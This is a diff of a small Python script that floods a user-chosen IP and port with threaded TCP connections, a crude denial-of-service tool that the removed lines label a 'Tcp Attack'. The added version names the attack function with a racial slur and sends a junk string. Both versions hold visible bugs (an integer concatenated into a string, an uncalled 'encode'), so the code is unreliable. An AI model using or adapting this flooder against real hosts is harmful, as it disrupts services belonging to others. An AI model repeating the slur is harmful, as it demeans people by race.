@@ -1,18 +1,15 @@
-import socket
-import threading
+import socket, threading
 
-ip = str(input('Ip: '))
-port = int(input('Port: '))
-times = int(input('Times: '))
+ip = str(input("ip: "))
+port = int(input("port: "))
+time = int(input("time: "))
 
-def tcp():
+def nigger():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
-  s.send("GET /" + port + " HTTP/1.1\r\n")
-  s.send("Host: " + ip + "\r\n\r\n");
-  print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
+  s.send("GET UR MOM".encode)
   s.close()
+	
+for _ in range(time):
+  threading.Thread(target = nigger).start() 
 
-for i in range(1, times):
-  th = threading.Thread(target = tcp)
-  th.start()
